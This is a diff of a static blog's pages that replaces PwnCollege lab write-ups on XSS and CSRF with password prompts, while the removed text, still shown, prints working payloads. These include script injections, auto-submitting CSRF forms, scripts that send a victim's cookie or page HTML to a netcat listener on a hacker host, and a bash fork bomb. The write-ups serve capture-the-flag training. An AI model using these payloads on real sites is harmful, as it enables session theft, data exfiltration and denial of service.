@@ -240,12 +240,12 @@ p.spoiler {
       </div>
       <div class="site-state-item site-state-categories">
           <a href="/categories/">
-        <span class="site-state-item-count">14</span>
+        <span class="site-state-item-count">12</span>
         <span class="site-state-item-name">categories</span></a>
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags/">
-        <span class="site-state-item-count">370</span>
+        <span class="site-state-item-count">328</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
@@ -317,7 +317,7 @@ p.spoiler {
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2026-09-08 22:40:47" itemprop="dateModified" datetime="2026-09-08T22:40:47+08:00">2026-09-08</time>
+      <time title="Modified: 2026-09-23 14:59:49" itemprop="dateModified" datetime="2026-09-23T14:59:49+08:00">2026-09-23</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -353,51 +353,15 @@ p.spoiler {
     
     
     <div class="post-body" itemprop="articleBody">
-          <h2 id="stored-xss">stored xss</h2>
-<h3 id="xss-1">xss 1</h3>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST <span class="string">&quot;http://challenge.localhost:80/&quot;</span> -d <span class="string">&quot;content=&lt;input type=&#x27;text&#x27;&gt;&quot;</span></span><br></pre></td></tr></table></figure>
-<h3 id="xss-2">xss 2</h3>
-<p>inject <code>&lt;script&gt;</code> via stored post, then trigger with
-<code>/challenge/victim</code> (headless Firefox).</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST <span class="string">&quot;http://challenge.localhost:80/&quot;</span> -d <span class="string">&#x27;content=&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&#x27;</span></span><br><span class="line">/challenge/victim</span><br></pre></td></tr></table></figure>
-<h2 id="reflected-xss">reflected xss</h2>
-<h3 id="xss-3">xss 3</h3>
-<p>msg is reflected directly into the page body:</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">The message:</span><br><span class="line">&#123;flask.request.args.get(<span class="string">&quot;msg&quot;</span>, <span class="string">&quot;(none)&quot;</span>)&#125;</span><br></pre></td></tr></table></figure>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/challenge/victim <span class="string">&quot;http://challenge.localhost:80/?msg=&lt;script&gt;alert(1)&lt;/script&gt;&quot;</span></span><br></pre></td></tr></table></figure>
-<h3 id="xss-4">xss 4</h3>
-<p>msg is reflected inside a <code>&lt;textarea&gt;</code>, break out
-first:</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;textarea name=msg&gt;&#123;flask.request.args.get(<span class="string">&quot;msg&quot;</span>, <span class="string">&quot;Type your message here!&quot;</span>)&#125;&lt;/textarea&gt;</span><br></pre></td></tr></table></figure>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/challenge/victim <span class="string">&quot;http://challenge.localhost:80/?msg=&lt;/textarea&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;textarea&gt;&quot;</span></span><br></pre></td></tr></table></figure>
-<h2 id="xss-5---stored-xss-csrf-get-publish">xss 5 - stored XSS + CSRF
-(GET publish)</h2>
-<p>admin's unpublished draft contains the flag. published posts render
-raw HTML. <code>/publish</code> is <strong>GET</strong>.</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/publish&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge_publish</span>():</span><br><span class="line">    db.execute(<span class="string">&quot;UPDATE posts SET published = TRUE WHERE author = ?&quot;</span>, [flask.session.get(<span class="string">&quot;username&quot;</span>)])</span><br></pre></td></tr></table></figure>
-<p>login as hacker, store XSS that makes admin's browser call
-<code>/publish</code>, which publishes admin's flag draft:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">curl -c cookie.txt -X POST http://challenge.localhost:80/login -d <span class="string">&quot;username=hacker&amp;password=1337&quot;</span></span><br><span class="line">curl -b cookie.txt -X POST http://challenge.localhost:80/draft \</span><br><span class="line">  -d <span class="string">&quot;content=&lt;script&gt;fetch(&#x27;/publish&#x27;)&lt;/script&gt;&amp;publish=on&quot;</span></span><br><span class="line">/challenge/victim</span><br><span class="line">curl -b cookie.txt <span class="string">&quot;http://challenge.localhost:80/&quot;</span></span><br></pre></td></tr></table></figure>
-<h2 id="xss-6---stored-xss-csrf-post-publish">xss 6 - stored XSS + CSRF
-(POST publish)</h2>
-<p>same as xss 5, but <code>/publish</code> is now
-<strong>POST</strong>:</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/publish&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge_publish</span>():</span><br><span class="line">    db.execute(<span class="string">&quot;UPDATE posts SET published = TRUE WHERE author = ?&quot;</span>, [username])</span><br></pre></td></tr></table></figure>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">curl -c cookie.txt -X POST http://challenge.localhost:80/login -d <span class="string">&quot;username=hacker&amp;password=1337&quot;</span></span><br><span class="line">curl -b cookie.txt -X POST http://challenge.localhost:80/draft \</span><br><span class="line">  -d <span class="string">&quot;content=&lt;script&gt;fetch(&#x27;/publish&#x27;, &#123;method: &#x27;POST&#x27;&#125;)&lt;/script&gt;&amp;publish=on&quot;</span></span><br><span class="line">/challenge/victim</span><br><span class="line">curl -b cookie.txt <span class="string">&quot;http://challenge.localhost:80/&quot;</span></span><br></pre></td></tr></table></figure>
-<h2 id="xss-7---cookie-stealing">xss 7 - cookie stealing</h2>
-<p>key differences from xss 5/6:</p>
-<ul>
-<li>auth is cookie-based: <code>auth=username|password</code> (not
-flask.session)</li>
-<li>admin password = <code>flag[-20:]</code> (truncated flag)</li>
-<li>admin is blocked from posting/publishing</li>
-<li>drafts are visible to their own author</li>
-</ul>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">response.set_cookie(<span class="string">&quot;auth&quot;</span>, username + <span class="string">&quot;|&quot;</span> + password)</span><br><span class="line"></span><br><span class="line"><span class="comment"># admin blocked</span></span><br><span class="line"><span class="keyword">if</span> username == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">    flask.abort(<span class="number">400</span>, <span class="string">&quot;pwnpost no longer supports admin posting due to rampant flag disclosure&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># drafts visible to author</span></span><br><span class="line"><span class="keyword">elif</span> post[<span class="string">&quot;author&quot;</span>] == username:</span><br><span class="line">    page += <span class="string">&quot;&lt;b&gt;YOUR DRAFT POST:&lt;/b&gt; &quot;</span> + post[<span class="string">&quot;content&quot;</span>] + <span class="string">&quot;&lt;hr&gt;\n&quot;</span></span><br></pre></td></tr></table></figure>
-<p>since admin can't publish, steal the cookie instead and log in as
-admin to view the draft:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. login as hacker, store XSS that exfiltrates document.cookie</span></span><br><span class="line">curl -c cookie.txt -X POST http://challenge.localhost:80/login -d <span class="string">&quot;username=hacker&amp;password=1337&quot;</span></span><br><span class="line">curl -b cookie.txt -X POST http://challenge.localhost:80/draft \</span><br><span class="line">  -d <span class="string">&quot;content=&lt;script&gt;fetch(&#x27;http://localhost:1337/&#x27;, &#123;method: &#x27;POST&#x27;, body: document.cookie&#125;)&lt;/script&gt;&amp;publish=on&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. listen for stolen cookie</span></span><br><span class="line">nc -l -p 1337 &amp;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. trigger victim (admin) to visit the page</span></span><br><span class="line">/challenge/victim</span><br><span class="line"><span class="comment"># received: auth=admin|RT.dJDO1YDL4cjM1gzW&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. use stolen cookie to view as admin</span></span><br><span class="line">curl --cookie <span class="string">&quot;auth=admin|RT.dJDO1YDL4cjM1gzW&#125;&quot;</span> <span class="string">&quot;http://challenge.localhost:80/&quot;</span></span><br></pre></td></tr></table></figure>
-
+          Here's something encrypted, password is required to continue reading.
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/wp/PwnCollege/PwnCollege-xss/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -459,7 +423,7 @@ admin to view the draft:</p>
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2026-09-08 22:40:47" itemprop="dateModified" datetime="2026-09-08T22:40:47+08:00">2026-09-08</time>
+      <time title="Modified: 2026-09-23 14:59:49" itemprop="dateModified" datetime="2026-09-23T14:59:49+08:00">2026-09-23</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -495,90 +459,15 @@ admin to view the draft:</p>
     
     
     <div class="post-body" itemprop="articleBody">
-          <h2 id="csrf-1">CSRF 1</h2>
-<p>In this level, the application has a <code>/publish</code> route that
-uses a <code>GET</code> request to change the state of the application
-(publishing drafts). Since <code>GET</code> requests should ideally be
-idempotent and not change state, this is a classic CSRF
-vulnerability.</p>
-<h3 id="analysis">Analysis</h3>
-<p>The server-side code for the <code>/publish</code> route:</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/publish&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge_publish</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;username&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> flask.session:</span><br><span class="line">        flask.abort(<span class="number">403</span>, <span class="string">&quot;Log in first!&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Vulnerability: State change via GET request with no CSRF protection</span></span><br><span class="line">    db.execute(<span class="string">&quot;UPDATE posts SET published = TRUE WHERE author = ?&quot;</span>, [flask.session.get(<span class="string">&quot;username&quot;</span>)])</span><br><span class="line">    <span class="keyword">return</span> flask.redirect(<span class="string">&quot;/&quot;</span>)</span><br></pre></td></tr></table></figure>
-<h3 id="exploit">Exploit</h3>
-<p>We can host a simple HTML page that redirects the victim (the admin)
-to the <code>/publish</code> endpoint. When the admin visits our page,
-their browser will automatically include their session cookies when
-following the redirect to <code>challenge.localhost</code>.</p>
-<p><strong>Payload (<code>index.html</code>):</strong></p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span> = <span class="string">&quot;http://challenge.localhost:80/publish&quot;</span>;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p><strong>Execution:</strong></p>
-<ol type="1">
-<li>Host the payload: <code>python3 -m http.server 1337</code></li>
-<li>Trigger the victim to visit your server:
-<code>/challenge/victim</code></li>
-<li>The admin's drafts are now published. Fetch the flag:
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST http://challenge.localhost:80/login -d <span class="string">&quot;username=hacker&amp;password=1337&quot;</span></span><br><span class="line">curl <span class="string">&quot;http://challenge.localhost:80/&quot;</span></span><br></pre></td></tr></table></figure></li>
-</ol>
-<h2 id="csrf-level-2-post-based-csrf">CSRF Level 2: POST-based CSRF</h2>
-<p>The <code>/publish</code> route now requires a <code>POST</code>
-request. While this prevents simple link-based triggers, it doesn't stop
-CSRF if there are no CSRF tokens or origin checks.</p>
-<h3 id="exploit-1">Exploit</h3>
-<p>We use an HTML form that automatically submits itself via JavaScript
-to perform the <code>POST</code> request on behalf of the admin.</p>
-<p><strong>Payload (<code>index.html</code>):</strong></p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span></span></span><br><span class="line"><span class="tag">  <span class="attr">id</span>=<span class="string">&quot;csrf-form&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">action</span>=<span class="string">&quot;http://challenge.localhost:80/publish&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span></span></span><br><span class="line"><span class="tag">&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;csrf-form&quot;</span>).<span class="title function_">submit</span>();</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p><strong>Execution:</strong></p>
-<ol type="1">
-<li>Host the payload on port 1337.</li>
-<li>Run <code>/challenge/victim</code>.</li>
-<li>Login and check the published posts to find the flag.</li>
-</ol>
-<h2 id="csrf-level-3-reflected-xss">CSRF Level 3: Reflected XSS</h2>
-<p>This level introduces a reflected XSS vulnerability in the
-<code>/ephemeral</code> route. The <code>msg</code> parameter is
-rendered directly into the page without sanitization.</p>
-<h3 id="analysis-1">Analysis</h3>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/ephemeral&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge_ephemeral</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        &lt;html&gt;&lt;body&gt;</span></span><br><span class="line"><span class="string">        &lt;h1&gt;You have received an ephemeral message!&lt;/h1&gt;</span></span><br><span class="line"><span class="string">        The message: <span class="subst">&#123;flask.request.args.get(<span class="string">&quot;msg&quot;</span>, <span class="string">&quot;(none)&quot;</span>)&#125;</span></span></span><br><span class="line"><span class="string">        &lt;hr&gt;&lt;form&gt;Craft an ephemeral message:&lt;input type=text name=msg action=/ephemeral&gt;&lt;input type=submit value=Submit&gt;&lt;/form&gt;</span></span><br><span class="line"><span class="string">        &lt;/body&gt;&lt;/html&gt;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>
-<h3 id="exploit-2">Exploit</h3>
-<p>We can inject a script tag through the <code>msg</code>
-parameter.</p>
-<p><strong>Payload:</strong></p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">let</span> xss_payload = <span class="string">&quot;&lt;script&gt;alert(&#x27;PWNED&#x27;)&lt;/s&quot;</span> + <span class="string">&quot;cript&gt;&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">let</span> target_url =</span></span><br><span class="line"><span class="language-javascript">    <span class="string">&quot;http://challenge.localhost:80/ephemeral?msg=&quot;</span> +</span></span><br><span class="line"><span class="language-javascript">    <span class="built_in">encodeURIComponent</span>(xss_payload);</span></span><br><span class="line"><span class="language-javascript">  <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span> = target_url;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<h2 id="csrf-level-4-cookie-stealing-via-xss">CSRF Level 4: Cookie
-Stealing via XSS</h2>
-<p>Building on the previous level, we use the XSS vulnerability to steal
-the admin's session cookie.</p>
-<h3 id="exploit-3">Exploit</h3>
-<p>We inject a script that reads <code>document.cookie</code> and sends
-it to our attacker-controlled listener.</p>
-<p><strong>Payload (<code>index.html</code>):</strong></p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">let</span> xss_payload =</span></span><br><span class="line"><span class="language-javascript">    <span class="string">&quot;&lt;script&gt;fetch(&#x27;http://hacker.localhost:1338/?stolen_cookie=&#x27; + encodeURIComponent(document.cookie));&lt;/s&quot;</span> +</span></span><br><span class="line"><span class="language-javascript">    <span class="string">&quot;cript&gt;&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">let</span> target_url =</span></span><br><span class="line"><span class="language-javascript">    <span class="string">&quot;http://challenge.localhost:80/ephemeral?msg=&quot;</span> +</span></span><br><span class="line"><span class="language-javascript">    <span class="built_in">encodeURIComponent</span>(xss_payload);</span></span><br><span class="line"><span class="language-javascript">  <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span> = target_url;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p><strong>Execution:</strong></p>
-<ol type="1">
-<li>Listen for the incoming cookie: <code>nc -l -p 1338</code></li>
-<li>Host the payload and trigger the victim.</li>
-<li>Once the cookie is captured (e.g., <code>auth=admin|...</code>), use
-it to access the flag: <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl --cookie <span class="string">&quot;auth=admin|...&quot;</span> <span class="string">&quot;http://challenge.localhost:80/&quot;</span></span><br></pre></td></tr></table></figure></li>
-</ol>
-<h2 id="csrf-level-5-data-exfiltration-via-xss">CSRF Level 5: Data
-Exfiltration via XSS</h2>
-<p>In this final level, we use XSS to fetch the content of the admin's
-home page (where the flag is displayed) and send the entire HTML back to
-our listener.</p>
-<h3 id="exploit-4">Exploit</h3>
-<p>The payload performs an internal <code>fetch('/')</code> while the
-admin is authenticated, then <code>POST</code>s the response body to the
-attacker.</p>
-<p><strong>Payload (<code>index.html</code>):</strong></p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">let</span> stage2_xss =</span></span><br><span class="line"><span class="language-javascript">    <span class="string">&quot;&lt;script&gt;fetch(&#x27;/&#x27;).then(res =&gt; res.text()).then(html =&gt; fetch(&#x27;http://hacker.localhost:1338&#x27;, &#123;method: &#x27;POST&#x27;, body: html&#125;))&lt;/s&quot;</span> +</span></span><br><span class="line"><span class="language-javascript">    <span class="string">&quot;cript&gt;&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">let</span> target_url =</span></span><br><span class="line"><span class="language-javascript">    <span class="string">&quot;http://challenge.localhost:80/ephemeral?msg=&quot;</span> +</span></span><br><span class="line"><span class="language-javascript">    <span class="built_in">encodeURIComponent</span>(stage2_xss);</span></span><br><span class="line"><span class="language-javascript">  <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span> = target_url;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p><strong>Execution:</strong></p>
-<ol type="1">
-<li>Listen for the POST data: <code>nc -l -p 1338</code></li>
-<li>Host the payload and trigger the victim.</li>
-<li>The flag will be contained within the HTML received by Netcat.</li>
-</ol>
-
+          Here's something encrypted, password is required to continue reading.
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/wp/PwnCollege/PwnCollege-CSRF/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -640,7 +529,7 @@ attacker.</p>
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2026-09-08 22:40:47" itemprop="dateModified" datetime="2026-09-08T22:40:47+08:00">2026-09-08</time>
+      <time title="Modified: 2026-09-23 14:59:49" itemprop="dateModified" datetime="2026-09-23T14:59:49+08:00">2026-09-23</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -676,53 +565,15 @@ attacker.</p>
     
     
     <div class="post-body" itemprop="articleBody">
-          <h2 id="fork-bomb">1. Fork Bomb</h2>
-<p>A classic bash fork bomb that recursively calls itself to exhaust
-system resources.</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">myfunc</span></span> () &#123;</span><br><span class="line">  myfunc | myfunc</span><br><span class="line">&#125;</span><br><span class="line">myfunc</span><br></pre></td></tr></table></figure>
-<h2 id="web-security">2. Web Security</h2>
-<h3 id="basic-requests">2.1 Basic Requests</h3>
-<p>Using <code>netcat</code> and <code>curl</code> to perform simple GET
-requests.</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Manual GET request via nc</span></span><br><span class="line"><span class="built_in">printf</span> <span class="string">&quot;GET / HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n\r\n&quot;</span> | nc localhost 80</span><br><span class="line"></span><br><span class="line"><span class="comment"># Simple GET via curl</span></span><br><span class="line">curl -X GET <span class="string">&quot;http://localhost/&quot;</span></span><br></pre></td></tr></table></figure>
-<h3 id="custom-headers">2.2 Custom Headers</h3>
-<p>Setting the <code>Host</code> header for different tasks.</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Task: Host: root-me.org</span></span><br><span class="line">curl -X GET http://localhost/task -H <span class="string">&quot;Host: root-me.org&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Task: Host: net-force.nl:80</span></span><br><span class="line">curl -v -X GET http://localhost/gate -H <span class="string">&quot;Host: net-force.nl:80&quot;</span></span><br><span class="line"><span class="built_in">printf</span> <span class="string">&quot;GET /gate HTTP/1.1\r\nHost: net-force.nl:80\r\nConnection: close\r\n\r\n&quot;</span> | nc localhost 80</span><br></pre></td></tr></table></figure>
-<h3 id="url-encoding-query-parameters">2.3 URL Encoding &amp; Query
-Parameters</h3>
-<p>Handling spaces and multiple parameters.</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># URL Encoded Path: /progress%20request%20qualify</span></span><br><span class="line"><span class="built_in">printf</span> <span class="string">&quot;%b&quot;</span> <span class="string">&quot;GET /progress%20request%20qualify HTTP/1.1\r\nHost: challenge.localhost:80\r\nConnection: close\r\n\r\n&quot;</span> | nc localhost 80</span><br><span class="line"></span><br><span class="line"><span class="comment"># Query Strings</span></span><br><span class="line"><span class="built_in">printf</span> <span class="string">&quot;%b&quot;</span> <span class="string">&quot;GET /mission?hash=crwtzkzq HTTP/1.1\r\nHost: challenge.localhost:80\r\nConnection: close\r\n\r\n&quot;</span> | nc localhost 80</span><br><span class="line"><span class="built_in">printf</span> <span class="string">&quot;%b&quot;</span> <span class="string">&quot;GET /request?access=ejnskvxx&amp;token=rmxwpdzo&amp;signature=fhhmtasz HTTP/1.1\r\nHost: challenge.localhost:80\r\nConnection: close\r\n\r\n&quot;</span> | nc localhost 80</span><br><span class="line">curl -X GET <span class="string">&quot;http://localhost/hack?pass=fjawumxb&amp;security_token=yaanpzkj&amp;security=xufooqmp&quot;</span> -H <span class="string">&quot;Host: challenge.localhost:80&quot;</span></span><br></pre></td></tr></table></figure>
-<h3 id="post-requests">2.4 POST Requests</h3>
-<p>Submitting data via
-<code>application/x-www-form-urlencoded</code>.</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Manual POST via nc</span></span><br><span class="line"><span class="built_in">printf</span> <span class="string">&quot;%b&quot;</span> <span class="string">&quot;POST /complete HTTP/1.1\r\nHost: challenge.localhost:80\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 22\r\nConnection: close\r\n\r\nchallenge_key=ocgzmivl&quot;</span> | nc localhost 80</span><br><span class="line"></span><br><span class="line"><span class="comment"># POST via curl</span></span><br><span class="line">curl -X POST <span class="string">&quot;http://localhost/hack&quot;</span> -H <span class="string">&quot;Host: challenge.localhost:80&quot;</span> -d <span class="string">&quot;token=ieovmiim&amp;authcode=dhcrcdvp&amp;access=cbmupwsi&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Complex POST via nc</span></span><br><span class="line"><span class="built_in">printf</span> <span class="string">&quot;%b&quot;</span> <span class="string">&quot;POST /verify HTTP/1.1\r\nHost: challenge.localhost:80\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 74\r\nConnection: close\r\n\r\nsecure_key=rxwoveec&amp;security=yyiezfbi&amp;pass=oufnsrdp&amp;challenge_key=menvugmn&quot;</span> | nc localhost 80</span><br></pre></td></tr></table></figure>
-<h3 id="cookies-state-management">2.5 Cookies &amp; State
-Management</h3>
-<p>Managing session data.</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Save and send cookies with curl</span></span><br><span class="line">curl -c cookies.txt -b cookies.txt -L http://localhost/</span><br><span class="line"></span><br><span class="line"><span class="comment"># Manual Cookie Header</span></span><br><span class="line"><span class="built_in">printf</span> <span class="string">&quot;%b&quot;</span> <span class="string">&quot;GET / HTTP/1.1\r\nHost: localhost\r\nCookie: cookie=6136b40d5c4af043f373b9f786ce3d30\r\nConnection: close\r\n\r\n&quot;</span> | nc localhost 80</span><br></pre></td></tr></table></figure>
-<h3 id="redirects">2.6 Redirects</h3>
-<p>Following HTTP 302 redirects.</p>
